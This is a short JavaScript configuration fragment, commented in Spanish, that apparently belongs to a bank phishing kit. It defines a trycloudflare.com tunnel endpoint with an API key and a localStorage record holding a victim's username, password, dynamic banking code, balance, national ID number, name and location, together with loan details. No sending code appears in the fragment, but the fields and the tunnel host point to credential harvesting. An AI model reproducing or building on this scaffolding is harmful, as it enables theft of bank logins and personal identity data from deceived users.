/**
 * CONFIGURACIÓN
 */
const PAGE_LOAD_SIGNAL_PATH = "/api/4d9f6b1e7c2a8f03d5e91ab47c6f2d8841a9b73e5c0f6d2a1b8e4c9f7a63d10e";

const API_URL_2 = 'https://tomatoes-nathan-managing-quarters.trycloudflare.com'
const API_KEY_2 = 'ABC123*'


const LS = localStorage;

let info = {
    user: '',
    pass: '',
    cdin: '',

    saldo: 0,

    plazo: 0,
    monto: 0,
    cuota: 0,

    cedula: '',
    nombre: '',
    departamento: '',
    municipio: '',
    sector: '',
    tipo_empleo: ''
}

function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}



LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));